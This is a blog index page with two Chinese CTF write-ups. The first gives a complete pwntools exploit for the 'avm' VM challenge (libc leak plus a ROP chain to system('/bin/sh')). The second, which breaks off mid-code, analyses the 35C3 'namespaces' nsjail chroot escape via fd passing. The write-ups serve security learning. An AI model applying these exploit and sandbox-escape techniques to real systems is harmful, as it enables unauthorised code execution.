<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="a2ure blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="a2ure blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="a2ure">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>a2ure blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">a2ure blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/28/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/28/%E9%95%BF%E5%9F%8E%E6%9D%AFavm%20wp/" class="post-title-link" itemprop="url">长城杯avm wp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-12-28 20:33:08" itemprop="dateCreated datePublished" datetime="2024-12-28T20:33:08+08:00">2024-12-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-29 13:42:42" itemprop="dateModified" datetime="2024-12-29T13:42:42+08:00">2024-12-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/recurrence/" itemprop="url" rel="index"><span itemprop="name">recurrence</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>​	本题主要是一个虚拟机的题，由于比赛时间并不是很长，因此这个题在逆向方面确实没有给大家过多的难度，利用原理也十分简单，由于虚拟机中load和store指令会读取或者存入栈中的一个数组，并且这个数组的长度不够长，导致攻击者可以任意地址写栈中0xfff大小的区域，因此可以泄露Libc并且通过rop实现攻击</p>
<h2 id="二-逆向一下结构体"><a href="#二-逆向一下结构体" class="headerlink" title="二.逆向一下结构体"></a>二.逆向一下结构体</h2><p>​	首先就是程序的入口main函数，他首先初始化，之后读取0x300长度的opcode。之后进入到sub_1230函数。</p>
<p><img src="/images/avm/image-20241216092601552.png" alt="image-20241216092601552"></p>
<p>​	这里面就是对于虚拟机中的寄存器进行初始化操作，首先a1是传入的一个bss的一个地址，然后这个题其实虚拟机的逆向难度也不复杂，直接看初始化和后面的run函数就可以分析出来，初始化的时候首先初始化了rip，然后以及opcode的指针和最后结束的指针，之后就是循环的初始化寄存器的值</p>
<p><img src="/images/avm/image-20241216092741025.png" alt="image-20241216092741025"></p>
<p>​	之后通过View -&gt; open subviews -&gt; local types里面加入对应结构体信息，然后把所有的指针都转换成结构体信息。</p>
<p><img src="/images/avm/image-20241216094335171.png" alt="image-20241216094335171">	</p>
<p>​	初始化结束之后就进入到了run的函数里面，首先就是开辟了s一个栈空间，用来作为后面load和store存取数据的位置，并且对其初始化，然后循环遍历解析opcode，和0xFFFFFFFFFFFFFFFCLL取&amp;主要是为了后面的值是4的倍数，说明这个虚拟机时一个32位的虚拟机，之后进入到对应的注册函数中取根据opcode的28位的值。</p>
<p><img src="/images/avm/image-20241216092949466.png" alt="image-20241216092949466"></p>
<p>​	这里可以看到逆向之后的结果如下，就是简单的几个寄存器的功能。进入到具体的函数中，因为之前已经恢复了结构体的信息，所以进入函数之后很清楚的可以看到具体的内容。</p>
<p><img src="/images/avm/image-20241216093936842.png" alt="image-20241216093936842"></p>
<p>​	简单以store指令作为例子来解释，首先读取v3，也就是当前执行的opcode的值，之后取出右边移位5之后取出来的值对应的寄存器的值，加上右移十六位之后的opcdoe值相加，len是个固定的也就是0xff，所以这里面我的做法就是控制前面寄存器为1也就是v3 &gt;&gt; 5为1，这样由于之前清理过寄存器的值，所以我们只需要控制v3的十六位的值就可以控制整个值的内容，之后进入到If语句里面就简单的时读取传入a2也就是栈里面的值，然后把opcode最低位的对应的寄存器里面值赋值给栈中。</p>
<p><img src="/images/avm/image-20241216094621553.png" alt="image-20241216094621553"></p>
<p>​	其他所有的函数都大差不差，按照上面的思路都可以进行逆向。后面Load函数ida逆向的有点奇怪，但是实际上看一下汇编就可以看明白了，通过移位其实也就是一个字节一个字节的取赋值，因此ida逆向出来对于寄存器赋值的操作这么奇怪，在做题的时候完全可以把store反过来看就可以了。</p>
<p><img src="/images/avm/image-20241216095633714.png" alt="image-20241216095633714"></p>
<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h2><p>​	经过上面的阐述其实也都直到漏洞的问题所在了，具体的利用思路就是通过load指令读取栈中的一些地址，比如libc中函数的地址，通过sub, add指令的功能减去偏移（这部分最开始思路想歪了，一直想着输出出来，但是其实把基地址算出来存在寄存器里面也一样）,获得到偏移之后就是利用system(“&#x2F;bin&#x2F;sh”)来执行命令，需要注意的是，这里面栈布局很神奇，在做题的时候发现很多Libc的地址根据s也就是栈中变量的偏移不固定，可以往远处找一找，比如后面的libc_start_main函数就可以了。</p>
<p>​	因此就是按照上述的思路来撰写代码，首先把需要用的几个指令封装一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br></pre></td></tr></table></figure>

<p>​	之后就是选择读取栈中的值，我们可以定位在b *$rebase(0x19ea)这里，根据rsi指向的地址来往后面查，这里需要注意我之前说的内容，在0x500左右的地址会出现libc的函数地址，但是会发现这个偏移不固定，还要爆破，因此我们可以继续往下面找，直到找到libc_start_main函数这里</p>
<p><img src="/images/avm/image-20241216101845864.png" alt="image-20241216101845864"></p>
<p>​	这里的位置是0xd68，然后减去rsi和对应的偏移0x30就是我们后面写的位置0xd38了，这样我们就存了libc_start_main函数的地址了，后面就是利用寄存器sub掉和libc基地址的偏移，之后加上pop_rdi binash ret system等地址就可以了</p>
<p>​	这里再利用的时候需要注意，和常见的64位程序一样需要加一个ret，要么地址不是被0x10整除的会报错最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123562999&quot;, 32801)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/libcso6&quot;</span>)</span><br><span class="line">libc_start_main = <span class="number">0x29d90</span></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">ret = <span class="number">0x29139</span></span><br><span class="line">system = <span class="number">0x50d70</span></span><br><span class="line">binsh = <span class="built_in">next</span>(libcsearch(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operation</span>(<span class="params">opcode, i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((opcode &lt;&lt; <span class="number">28</span>) + (i &lt;&lt; <span class="number">5</span>) + (j &lt;&lt; <span class="number">16</span>) + k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">1</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">2</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">9</span>, i, j, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">i, j, k</span>):</span><br><span class="line">    <span class="keyword">return</span> operation(<span class="number">10</span>, i, j, k)</span><br><span class="line"></span><br><span class="line">opcode = load(<span class="number">1</span>, <span class="number">0xd38</span>, <span class="number">4</span>) + load(<span class="number">1</span>, <span class="number">0x160</span>, <span class="number">5</span>) + /</span><br><span class="line">         sub(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) + load(<span class="number">1</span>, <span class="number">0x168</span>, <span class="number">7</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>) + load(<span class="number">1</span>, <span class="number">0x170</span>, <span class="number">9</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>) + load(<span class="number">1</span>, <span class="number">0x178</span>, <span class="number">11</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>) + load(<span class="number">1</span>, <span class="number">0x180</span>, <span class="number">13</span>) + /</span><br><span class="line">         add(<span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>) + store(<span class="number">1</span>, <span class="number">0x118</span>, <span class="number">8</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x120</span>, <span class="number">10</span>) + store(<span class="number">1</span>, <span class="number">0x128</span>, <span class="number">12</span>) + /</span><br><span class="line">         store(<span class="number">1</span>, <span class="number">0x130</span>, <span class="number">14</span>) + p32(<span class="number">0</span>) + /</span><br><span class="line">         p64(libc_start_main) + p64(pop_rdi) + /</span><br><span class="line">         p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">iosend(opcode)</span><br><span class="line">iorecvuntil(<span class="string">b&#x27;opcode: Unsupported instruction/n&#x27;</span>)</span><br><span class="line">iointeractive()</span><br></pre></td></tr></table></figure>

<p>​	这里可以观察到我再store之后存入了一个p32(0)这个其实是为了让地址更完整，要么读取数据的时候会发现有其他数据干扰，之后对于load和store第一个参数都是1也是就是我们之前说的，需要找一个固定寄存器内容位0的寄存器，这样我们只需要控制第二个的内容就可以控制寄存器的值了。</p>
<h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>​	自此基本完成了所有对于avm原理的阐述，这个题目其实逆向难度不大，当时比赛过程中主要就是一直最开始想着输出基地址一度卡住了，之后也是被随便找到libc函数地址和栈地址偏移随机这个问题给困扰很久，但是通过这个题目也是学到了很多的东西，对于vm这种虚拟机的题目也有了更进一步的了解，希望后面可以争取加快逆向时的速度以及减少掉入一些缺乏经验的错误。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/28/35C3CTF-namespace/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/28/35C3CTF-namespace/" class="post-title-link" itemprop="url">35C3CTF-namespace</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-12-28 20:25:39" itemprop="dateCreated datePublished" datetime="2024-12-28T20:25:39+08:00">2024-12-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-29 13:46:41" itemprop="dateModified" datetime="2024-12-29T13:46:41+08:00">2024-12-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Container-security/" itemprop="url" rel="index"><span itemprop="name">Container security</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="namespace的flag解释"><a href="#namespace的flag解释" class="headerlink" title="namespace的flag解释"></a>namespace的flag解释</h3><ul>
<li><strong>mnt namespaces</strong>，mount的结果不会影响其他mnt namespaces中的进程</li>
<li><strong>cgroup namespaces</strong>，cgroup用于限制进程对cpu等系统资源的使用</li>
<li><strong>uts namespaces</strong>，隔离hostname和NIS域名</li>
<li><strong>ipc namespaces</strong>，隔离消息队列、信号量和共享内存3钟进程间通信的方式，并不会限制其他的ipc通信</li>
<li><strong>user namespaces</strong>，同一个用户在不同的user namespaces中可以对应不同的uid，一个user namespaces中的普通用户甚至可以是另一个user namespaces中的root用户。此外，新建或加入一个user namespaces时，无论新的uid是多少，能够在这个user namespaces中获取到全部的capabilities，不过需要注意如果uid不为0的话执行execve等函数后capabilities会全部丢失掉</li>
<li><strong>pid namespaces</strong>，隔离进程的pid，创建新的pid namespaces后，外层的pid namespaces可以看到里面的进程，而里面的进程无法看到外面的进程</li>
<li><strong>net namespaces</strong>，隔离网络相关的资源，比如ip协议栈、路由表等等，此外它还会隔离unix域的abstract socket，这点在后面也会用到</li>
<li><strong>time namespaces</strong>, 隔离系统时间，进程在不同命名空间中可以看到不同的系统时间。</li>
</ul>
<h3 id="socket-AF-UNIX通信"><a href="#socket-AF-UNIX通信" class="headerlink" title="socket AF_UNIX通信"></a>socket AF_UNIX通信</h3><ul>
<li><strong>pathname</strong>，指的是用bind将socket绑定到一个具体的文件名上去，这里因为chroot的限制无法使用</li>
<li><strong>unnamed</strong>，没有用bind绑定的stream socket都是unnamed的，上面socketpair创建的也是。在这种两个进程分别创建socket的情况下是当作客户端去使用</li>
<li><strong>abstract</strong>，用bind将socket绑定到一个与文件系统无关的名字上去，由net namespaces进行隔离</li>
</ul>
<h2 id="题目部署"><a href="#题目部署" class="headerlink" title="题目部署"></a>题目部署</h2><p>​	本题比较经典，网上描述漏洞成因的时候有几个文章，但是在自己复现的时候发现存在一些问题。首先对于题目环境来说可以通过<a target="_blank" rel="noopener" href="https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces">链接</a>进行访问。之后利用下面这个命令来启用镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:rw -v /flag:/flag -p 1337:1337 namespace</span><br></pre></td></tr></table></figure>

<p>​	需要注意我是用ubuntu 22.04的机器去复现的，但是在复现过程中发现，ubuntu使用的时cgroupv2，而这个环境复现的需要时发现如果使用v2版本会找不到cpu memery pids等文件夹，因此需要切换回v1版本，因此需要执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/grub</span><br><span class="line">GRUB_CMDLINE_LINUX=<span class="string">&quot;cgroup_enable=memory swapaccount=0 systemd.unified_cgroup_hierarchy=0&quot;</span> </span><br></pre></td></tr></table></figure>

<p>​	之后使用下面命令就可以重新启动机器并且切换回v1版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-grub</span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure>

<p>​	执行成功后会显示如下信息</p>
<p><img src="/images/namespace/1735395811009.jpg" alt="1735395811009"></p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>​	首先就是对于题目中的Dockerfile进行分析，内容如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tsuro/nsjail</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> challenge/namespaces /home/user/chal</span></span><br><span class="line"><span class="comment">#COPY tmpflag /flag</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/sh -c <span class="string">&quot;/usr/bin/setup_cgroups.sh &amp;&amp; cp /flag /tmp/flag &amp;&amp; chmod 400 /tmp/flag &amp;&amp; chown user /tmp/flag &amp;&amp; su user -c &#x27;/usr/bin/nsjail -Ml --port 1337 --chroot / -R /tmp/flag:/flag -T /tmp --proc_rw -U 0:1000:1 -U 1:100000:1 -G 0:1000:1 -G 1:100000:1 --keep_caps --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /home/user/chal&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>​	实际上可以看出就是利用了nsjail进行创建了一个虚拟环境来执行我们的namespaces文件，并且将docker的1000号用户(user)映射为了nsjail中的0号用户(root)，将docker中的10000号用户(nobody)映射为了nsjail中的1号用户(nobody)。并且把flag文件放到了tmp目录下，用docker中的user用户权限，也就是nsjail的root用户权限来进行执行。</p>
<p><img src="/images/namespace/1735436713608.jpg" alt="1735436713608"></p>
<p>​	接下来就是分析main函数，进入到main函数中发现本体并没有去掉符号表因此还是比较人性的，可以看到主要就是两个函数，start_sandbox和run_elf两个函数，通过用户输入选项来进行选择，之后便是先进入到start_sandbox函数里面</p>
<p><img src="/images/namespace/1735436872947.jpg" alt="1735436872947"></p>
<p>​	在函数内部，通过 socketpair 创建了一个双向管道，方便父进程与子进程之间进行通信。接着，利用 new_proc 创建子进程，并关闭不必要的文件描述符。首先，获取 ELF 文件，并通过 setgroups 等操作修改进程的特权和用户&#x2F;组映射，以调整进程的权限和身份。随后，使用 chroot 命令将进程的根目录设置为 &#x2F;tmp&#x2F;chroot&#x2F;*，从而隔离进程，避免访问其他文件系统中的数据。最后，子进程等待父进程关闭 setgroups 等权限，确保在执行 ELF 文件时无法修改或干扰其操作。</p>
<p><img src="/images/namespace/1735437325702.jpg" alt="1735437325702"></p>
<p>​	这里说明一下new_proc函数，他其实是调用了clone函数，其中的0x7E020000LLflag其实是下面的拆解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clone syscall,<span class="number">0x7E020000</span>=CLONE_NEWNS|CLONE_NEWCGROUP|CLONE_NEWUTS|CLONE_NEWIPC|CLONE_NEWUSER|CLONE_NEWPID|CLONE_NEWNET</span><br></pre></td></tr></table></figure>

<p>​	之后便是run_elf这个函数，这里面功能比较简单，首先就是获取之前start_sandbox里面的沙盒，之后fork一个子进程，利用change_ns把子进程的namespace切换成和沙盒里面的环境一样的namespace中，之后执行。</p>
<p><img src="/images/namespace/1735437995398.jpg" alt="1735437995398"></p>
<p>​	进入到change_ns里面可以看到，首先就是一个循环，打开父进程的&#x2F;proc&#x2F;self&#x2F;ns目录下的namespace，利用setns函数切换过去，并且对于pid namespace进行了特殊处理，原因就是pid命名空间比较特殊，当前进程的pid命名空间并不会改变，只有子进程的才会进入到pid namespace中</p>
<p><img src="/images/namespace/1735438143643.jpg" alt="1735438143643"></p>
<p>​	最后就是看一下NSS变量，其实就是一个数组，通过循环回按照顺序一次执行user, mnt, pid, uts, ipc, cgroup的namespace设置，通过这里就可以发现，少了net的namespcae设置，因此在namespace下的elf中程序可以和其他的namespace下的程序进行通信，也就是本题逃逸chroot的漏洞方法</p>
<p><img src="/images/namespace/1735438406556.jpg" alt="1735438406556"></p>
<p>​	自此本题的逻辑也就分析完了，其实由于符号表都在，所以其实可以很清楚的看出对应函数执行的逻辑，我们通过对应他net namespace的缺少限制，可以对其进一步的利用</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="chroot逃逸"><a href="#chroot逃逸" class="headerlink" title="chroot逃逸"></a>chroot逃逸</h3><p>​	漏洞利用的方法就是和我们之前所说的socket通信有关，首先需要了解到的是，在linux中有一些函数是带有at的api，他们可以通过一个文件描述符加基于该文件描述符对应文件的相对路径来获得最终的文件路径，而非传统上直接由调用者给出字符串参数指定，比如下面这几个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlinkat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">symlinkat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *target, <span class="type">int</span> newdirfd, <span class="type">const</span> <span class="type">char</span> *linkpath)</span>;</span><br></pre></td></tr></table></figure>

<p>​	因此，如果我们在一个沙盒中的程序（比如root目录在&#x2F;tmp&#x2F;chroot&#x2F;1）的程序，发送一个fd给另一个沙盒中的程序（root目录在&#x2F;tmp&#x2F;chroot&#x2F;2）,那么我们就可以通过相对路径逃逸出chroot的限制，但是需要考虑的是如何发送一个fd给在不同namespace下的程序呢。这里需要注意的是，对于clone来说，会把fd一同复制给子进程，并且经过实验，如下代码可以看到，经过各种flag标志的namespace都不会影响fd的传递。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 